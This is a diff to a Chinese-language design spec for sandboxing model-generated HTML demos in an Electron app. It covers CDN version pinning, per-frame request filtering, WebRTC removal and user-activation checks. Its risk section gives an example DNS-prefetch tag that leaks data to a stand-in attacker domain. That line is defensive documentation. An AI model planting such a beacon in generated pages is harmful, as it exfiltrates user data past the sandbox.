@@ -83,9 +83,9 @@ Atrium 自带的 pi 扩展（ADR-0008）在系统提示里加一段英文说明�
   ```
 
 - **CDN 白名单**（2026-11-05 用户定，照 Codex）：`https://cdnjs.cloudflare.com`、`https://cdn.jsdelivr.net`、`https://esm.sh`、`https://unpkg.com`、`https://fonts.googleapis.com`、`https://fonts.gstatic.com`。**只许写死版本的路径**（2026-11-05 用户定）：CSP 管不到路径里的版本，所以演示用单独的 Electron session，宿主在 `webRequest.onBeforeRequest` 里按站点检查地址，不合规的拦下：
-  - `cdn.jsdelivr.net`：`/npm/<包>@<x.y.z>/…`、`/gh/<用户>/<仓库>@<版本>/…`
+  - `cdn.jsdelivr.net`：`/npm/<包>@<x.y.z>/…`、`/gh/<用户>/<仓库>@<版本>/…`，`<版本>` 是完整的 40 位提交号，或 `vX.Y.Z` / `X.Y.Z` 的标签（短提交号也可能是分支名，不算写死，MV1 审查后定）
   - `unpkg.com`：`/<包>@<x.y.z>/…`
-  - `esm.sh`：路径里的包名带 `@<x.y.z>`（esm.sh 自己引的依赖也带版本，放行）
+  - `esm.sh`：路径里的包名带 `@<x.y.z>`。MV1 实测：esm.sh 给的模块按依赖声明的范围引依赖（`/d3-array@3?target=es2022`、`/base64-js@^1.3.1?target=es2022`），不是写死的版本，演示自己也能写出同样的地址，所以**不放行**；系统提示让模型在 esm.sh 上加 `?bundle`（依赖打进同一个文件）。esm.sh 自己的 Node 垫片 `/node/<名字>.mjs` 不随包变，放行。依赖范围照旧拦下（2026-11-06 用户定）。
   - `cdnjs.cloudflare.com`：`/ajax/libs/<名字>/<x.y.z>/…`
   - 字体的两个站点不带版本，照放。
   - 拦下的请求在演示里就是加载失败；日志只记被拦的次数和站点，不记完整地址。
@@ -113,7 +113,7 @@ Atrium 自带的 pi 扩展（ADR-0008）在系统提示里加一段英文说明�
 
 ### 手机端
 
-手机端（SPEC-0005）的消息流遇到 `visual` 代码块，显示一张卡片："演示 · <文件名>，在电脑上查看"。不渲染，第一版也不经 relay 传 HTML。
+手机端（SPEC-0005）的消息流遇到 `visual` 代码块，显示一张卡片：第一行是标题行"演示 · <文件名>"（太长截断），第二行另起"在电脑上查看"，文件名再长也挤不掉这句说明（2026-11-06 用户定，同 design-language）。不渲染，第一版也不经 relay 传 HTML。
 
 ## 接口与数据
 
@@ -126,6 +126,28 @@ Atrium 自带的 pi 扩展（ADR-0008）在系统提示里加一段英文说明�
 - **插话记录**：`turns/<会话 id>.json` 的每条用户消息可以多一个 `source: { kind: "visual", path }`（新增可选字段，不升版本）。
 - **扩展**：系统提示里多一段演示说明，带演示目录的路径。
 
+### MV1 实现时定的细节（2026-11-05）
+
+照协议包的命名，名字改成下划线，含义不变：
+
+- `resolve_visual { sessionId, path }` → `{ url, size, mtime }`；错误码 `visual_outside`（不在演示目录里、不是 `.html`、路上有符号链接）、`visual_missing`、`visual_too_large`，会话不存在照常是 `session_not_found`。同一个文件在宿主的一次运行里总是同一个令牌；文件变了，界面在地址后面加 `?v=<mtime>` 重新加载。
+- `visual_changed { sessionId, path, mtime }`：只发给 resolve 过这个文件的连接。宿主按文件所在的目录监视（编辑器整份替换文件时，监视单个文件会断），连接断开就停；客户端重连后把还有卡片在用的再 resolve 一遍（卡片卸载就不记了；一次最多 20 个、隔 200 ms 再下一批，不会撞上宿主每秒 200 条的上限；断线没 resolve 成的留着下次再试，失败的也留着，卡片显示原因）。文件被删了也发（`mtime` 为 0），卡片再 resolve 就显示"找不到"；resolve 时还不存在的文件也照样监视（文件夹还没有时监视最近一层已有的上级目录），出现了就发。宿主只留有连接在看的令牌和发送时间，没人看了就丢；同一次运行里有人在看的文件令牌不变。连接断开或宿主关了以后才完成的 resolve 不再加监视（MV1 审查后加）。
+- `send_visual_message { sessionId, path, text }` → `{ disposition }`，同 `steer`（运行中是插话，空闲时是新的一轮），另加 `dropped`：同一个演示 1 秒内的第二条（检查文件之前就占住这一秒，两条同时到也只发一条）；界面把 `dropped` 当没发出，演示里的 `sendMessage` 得到 `false`。`text` 最长 4 000 字符，超了是 `invalid_message`，界面先丢掉不发。
+- 演示目录由会话所在的容器给：宿主组装时注入"会话 → 演示目录"的函数，现在只有默认的 `~/.atrium/visuals/<会话 id>/`，学习方向（ML4）换成方向目录下的 `visuals/`。扩展经启动参数 `--atrium-visuals=<base64url 的 JSON>` 拿到这个目录（同 `--atrium-agent`），系统提示分段名 `atrium_visuals`。
+- **分叉和子对话读得到上级会话的演示**（2026-11-06 用户定）：它们带着复制来的历史，里面引用的演示在上级会话的目录里。所以一个会话 resolve 时，路径落在它自己的演示目录，或者沿着索引里记的上级（子对话的 `parent`；脱离后记在 `detachedFrom`）一路往上任何一个会话的演示目录里，都算在演示目录里。只读、不复制文件；新写的演示仍然进自己的目录。上级链有环也只走一遍；和它没有上下级关系的会话的目录照样是 `visual_outside`。
+- 演示 frame 的导航只许到 `atrium-visual:`（不许导航到 CDN 上的页面、`data:`、`blob:`，那里没有演示的 CSP，MV1 审查后加）。演示里再开的 frame：`data:`、`blob:`、带地址的都按导航被请求过滤拦下；`srcdoc` 和 `about:blank` 不经过请求，`will-frame-navigate` 也看不到 `srcdoc`（实测），而 `srcdoc` 子 frame 自己跑脚本、有一份新的 `RTCPeerConnection`（MV1 三方审查发现，`frame-src 'none'` 管不到）。所以预加载脚本在每个 frame 里都跑（`nodeIntegrationInSubFrames`，仍然没有 Node）：应用页面拿到桥，别的 frame 只在自己的脚本跑之前被拿掉所有 `RTC*`、`webkitRTC*`（同外壳里那一步）。请求过滤里没有 frame 的请求（主进程自己的、Worker 的）也按名单放行：应用页面和宿主的源、`atrium-visual:`、`data:`、`blob:`、白名单站点里写死版本的地址，别的一律拦下；重定向的每一跳都再查一次。演示的 `window.open` 被 iframe 的 sandbox 挡在渲染进程里，到不了主进程的 `setWindowOpenHandler`（e2e 实测，系统浏览器没被叫起）。DNS 预解析：演示的响应带 `X-DNS-Prefetch-Control: off`；e2e 用 net-log 实测，演示里的 preconnect、prefetch、链接都不解析，但 `<link rel="dns-prefetch">` 照样解析（Chromium 按 frame 的设置决定，不看这个头，Electron 没有关掉它的办法），2026-11-06 用户定作为已知的残余风险接受，见"风险与待定问题"。被拦的请求在主进程 stderr 只记总数（站点名可能就是模型编进去的数据）。WebRTC：演示用不上，整个关掉（2026-11-06 用户定）。外壳的桥在片段之前运行，把演示 frame 全局上所有 `RTC*`、`webkitRTC*` 构造函数换成不可配置、不可写的 `undefined`，片段删不掉也装不回；演示里再开的 `about:blank` 子 frame 是另一个不透明源，拿不到它的全局；Worker 里没有 `RTCPeerConnection`，`RTCDataChannel` 不能直接构造。窗口另设 `disable_non_proxied_udp`。STUN/UDP 和 TURN over TCP 都连不出去（e2e 实测）。
+- 片段经宿主的 HTTP 端口 `/visual/<令牌>/<文件名>` 提供（只认令牌，文件名只是给人看的），Electron 主进程把 `atrium-visual://<令牌>/<文件名>` 转发过去并换上 CSP，同 `atrium://app`。宿主自己的响应头也带同一份 CSP，再加 `sandbox allow-scripts`：直接用浏览器打开这个地址，片段也是不透明源，连不上宿主。单独运行的宿主（浏览器里开界面）没有 `atrium-visual:`，卡片显示加载失败（2026-11-06 用户确认）。
+- **单独的 Electron session 做不到，换成按 frame 过滤**（2026-11-06 用户确认）：iframe 和它所在的页面属于同一个 webContents，Electron 的 session 是按 webContents 分的，不能给一个 iframe 单独的 session；要单独的 session 只能用 `<webview>`（security.md 没开）或盖在消息流上的 WebContentsView（滚动、裁剪要自己算，`capturePage(iframe 的矩形)` 也是按 iframe 在窗口里写的）。所以在默认 session 的 `webRequest.onBeforeRequest` 里看发起请求的 frame：不是应用页面本身的（演示 iframe；Worker 的请求没有 frame，见上一条），只放行 `atrium-visual:`、`data:`、`blob:` 和白名单站点里写死版本的地址，其他一律拦下，包括演示把自己导航到别的地址。应用页面自己的请求不受影响。效果和 SPEC 要的一样。
+- **"刚点过"在界面再查一次**：外壳里的检查挡不住片段自己调 `postMessage`（它们在同一个 JS 环境里），所以界面收到 `ui/message` 时再查：这个 iframe 是当前的焦点元素，并且页面的 `navigator.userActivation.isActive` 为真（Chromium 把子 frame 的激活传给上层）。实现和审查时发现片段能用脚本把焦点移进自己（`element.focus()`），借走 Atrium 里打字的激活，或者另一个演示刚被点的激活，所以在桌面端再要一条：主进程把窗口里每次按下鼠标的位置（`input-event`，含 frame 里的）告诉页面，页面在**收到的那一刻**用 `elementFromPoint` 看按在了哪个元素上，记下"按在了这个 iframe 上"；`ui/message` 要有 5 秒内（Chromium 用户激活的时长）、按在这个 iframe 上、还没用过的一次按下，一次按下最多发一条。按在被消息区裁掉、盖在输入框下面的那部分不算（那里最上面的是输入框），按下之后滚动、换位置也不会让另一个演示借走。其他条件都过了才用掉这次按下，格式不对、没有焦点的消息不会把它耗掉。按下的通知和消息谁先到不一定，消息先到时等最多 300 ms。键盘（Tab 进演示再按回车）因此发不出，要鼠标按下（2026-11-06 用户确认）。没有桌面端时（浏览器里开界面）退回：页面自己 5 秒内有点按或按键就不收。
+- 和外壳之间的消息照 MCP Apps 的 JSON-RPC：外壳发 `ui/initialize`，界面回主题（`theme` 和 `styles.variables`）；深浅色变了发 `ui/notifications/host-context-changed`；外壳报高度 `ui/notifications/size-changed`；回传 `ui/message`（`{ role: "user", content: { type: "text", text } }`）。截图要知道演示有没有在被操作，外壳另报 `atrium/notifications/activity`（不是 MCP Apps 的）。
+- 颜色变量（不强制用）：`--surface-1`～`--surface-3`、`--code`、`--text`、`--text-2`、`--text-3`、`--text-muted`、`--text-dim`、`--line`、`--line-soft`、`--line-strong`、`--hover`、`--selected`、`--tint`、`--on-tint`、`--attn`、`--danger`、`--ok`、`--diff-add-bg`、`--diff-del-bg`，以及 `--font-sans`、`--font-mono`、`--fs`、`--fs-sm`、`--fs-xs`、`--r-sm`、`--r`、`--r-md`；值从界面当时的 token 读出来。主题到之前外壳先不显示（最多 300ms）。
+- 图标名单在 `packages/pi/src/visuals/`，系统提示照它列名字；SVG 由宿主按名单从 Hugeicons 取。
+- 来源：`Turn.user.source` 是可选字段，来自演示时为 `{ kind: "visual", path }`，否则没有这个字段（不写 `null`，照协议代码）；插话记录里是 `sources: { <条目 id>: { kind, path } }`。**运行中送达、成了一轮里的"插话"步骤的，第一版不标来源**，只有开了新一轮的才标（2026-11-06 用户确认）。
+- 截图只存在界面内存里（不落盘），按演示地址最多留 64 个、只留每个最新的一张，最久没用的先丢（2026-11-06 用户确认）；另外总共不超过 32 MB（按 `data:` 地址的长度算），超了也从最久没用的丢。卡片不另存一份，丢了就换回占位卡。截图记着截的时候是深色还是浅色，主题换了旧图不用，回到视口再截。截之前看 frame 的四角和中心最上面是不是 frame 自己，被菜单、弹窗盖住时不截（MV1 审查后加）。
+- 加载失败：frame 加载后 10 秒内外壳没发 `ui/initialize`（文件在加载前没了、协议出错、浏览器里开界面没有 `atrium-visual:`），卡片换成"演示加载失败"。卡片从失败恢复后，视口观察跟着新的元素。
+- ⌘W、⌘,：焦点在演示里时页面收不到按键，所以由主进程在 `before-input-event` 里接住这两个键，告诉页面关标签、开设置，和页面自己收到时做的一样（SPEC 正文"键盘"一条，MV1 审查后补）。
+- 标题行右端"在查看标签里打开"：查看标签只读工作区里的文件，所以只在 `path` 是相对路径、会话有工作区时显示；默认目录 `~/.atrium/visuals/` 不在工作区里，这个按钮不出现（2026-11-06 用户确认）。
+
 ## 备选方案
 
 - **引用写成裸行（Codex 的 `visualize{…}`）**：解析要另写一层，不认识它的地方会显示一行看不懂的文字。不用。
@@ -135,6 +157,9 @@ Atrium 自带的 pi 扩展（ADR-0008）在系统提示里加一段英文说明�
 - **点回答前弹确认框**：Codex 的做法。用户定直接发，靠"刚点过"的检查防止演示自己发消息。
 
 ## 风险与待定问题
+
+- [x] **DNS 预解析**（MV1 三方审查后实测；2026-11-06 用户定：作为已知的残余风险接受，不改代码）：演示里的 `<link rel="dns-prefetch" href="//<数据>.evil.example">` 会让 Chromium 去解析这个域名。漏出去的只有域名本身，经 DNS 查询到对方的权威 DNS 服务器：不发 HTTP 请求、没有请求体、拿不到任何回应，演示也读不到解析结果。接受的理由：Chromium 按 frame 的设置决定、不看 `X-DNS-Prefetch-Control`，Electron 没有开关；整个应用用 `--host-resolver-rules` 只许解析白名单域名会弄坏回复里的远程图片；而 agent 本身用工具就能联网，这条通道不比它多给什么。以后要堵：把回复里的远程图片改走宿主转发，再给整个应用加解析白名单；或者 Electron/Chromium 有了关掉 frame DNS 预解析的开关时打开它。e2e 用 net-log 断言现状（只有 `dns-prefetch` 那个名字被解析），堵上之后这条断言要跟着改。
+- [x] **esm.sh 按范围引的依赖**（2026-11-06 用户定）：照旧拦下，过滤不改。系统提示要求模型永远写死完整版本，esm.sh 上一律加 `?bundle`，让依赖打进同一个文件，不再发按范围的子请求。
 
 - [x] **没网时打不开**：走 CDN 的演示离线会缺库。2026-11-05 用户定：不缓存，离线时演示里缺库的部分就是打不开。
 - [x] **CDN 上的代码**：白名单里的地址谁都能发包。2026-11-05 用户定只许写死版本的路径（见"沙箱"）；剩下的风险是写死的那个版本本身有问题，它跑在沙箱里、不能联网、拿不到对话，接受。
